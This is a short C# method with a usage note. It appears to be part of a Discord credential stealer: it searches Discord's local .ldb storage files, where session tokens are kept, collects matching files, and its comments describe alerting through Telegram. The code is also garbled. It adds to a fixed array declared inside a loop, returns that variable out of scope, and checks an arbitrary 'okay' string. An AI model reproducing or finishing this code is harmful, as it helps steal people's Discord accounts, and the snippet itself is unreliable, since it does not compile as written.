 private static List<string> SearchForFile()
    {
        // LDB file used to locate Discord client.
        // First, build the path to the Discord client ldb file.
        // If the path does not exist, send a message notification through Telegram.
        // Traverse all ldb files in this path and read their contents.
        // If the file content contains the "okay" string, add the file content to the ldbFiles list.

        // Use the `Directory.GetDirectories` method to get a list of directories in the specified path.
        string path = @"C:\Users\User\AppData\LocalLow\Discord";
        string[] directories = Directory.GetDirectories(path);

        // Loop through each directory and search for ldb files.
        foreach (string directory in directories)
        {
            string[] ldbFiles = Directory.GetFiles(directory, "*.ldb", SearchOption.AllDirectories);

            // Traverse each ldb file and read its contents.
            foreach (string ldbFile in ldbFiles)
            {
                using (StreamReader reader = new StreamReader(ldbFile))
                {
                    string contents = reader.ReadToEnd();

                    // Check if the file contents contain the "okay" string.
                    if (contents.Contains("okay"))
                    {
                        // Add the file contents to the ldbFiles list.
                        ldbFiles.Add(ldbFile);
                    }
                }
            }
        }

        // Return the list of ldbFiles.
        return ldbFiles;
    }

Note: This code assumes that the Discord client is installed in the `C:\Users\User\AppData\LocalLow\Discord` directory on the local machine. If the Discord client is installed in a different directory, you will need to modify the `path` variable accordingly.

